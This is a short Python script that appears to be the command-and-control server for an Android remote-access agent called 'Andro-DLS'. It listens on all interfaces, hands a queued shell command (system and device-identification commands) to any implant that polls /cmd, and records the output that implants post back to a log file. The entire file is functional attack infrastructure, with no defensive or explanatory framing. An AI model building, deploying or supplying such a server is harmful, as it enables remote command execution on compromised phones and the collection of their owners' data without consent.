#!/usr/bin/env python3
# Andro-DLS C2 Server - HTTP listener
import http.server
import urllib.parse
import json
import time

HOST = '0.0.0.0'   # bind all interfaces so the phone can reach us
PORT = 8080
LOG_FILE = "c2_log.json"

# Command to send to the next agent that checks in.
# Set to "NONE" to send no command.
PENDING_CMD = "id; uname -a; getprop ro.product.model"

class C2Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *args): pass

    def do_GET(self):
        if self.path == '/cmd':
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(PENDING_CMD.encode())
            return
        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        post = self.rfile.read(length).decode('utf-8', 'replace')
        parsed = urllib.parse.parse_qs(post)
        entry = {"timestamp": time.time(), "path": self.path, "data": parsed}
        with open(LOG_FILE, 'a') as f:
            f.write(json.dumps(entry) + "\n")
        print(f"[+] Result received: {parsed.get('out', [''])[0][:200]}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'RECEIVED')

with open(LOG_FILE, 'a'):
    pass
print(f"[*] C2 Server listening on {HOST}:{PORT}")
httpd = http.server.HTTPServer((HOST, PORT), C2Handler)
httpd.serve_forever()
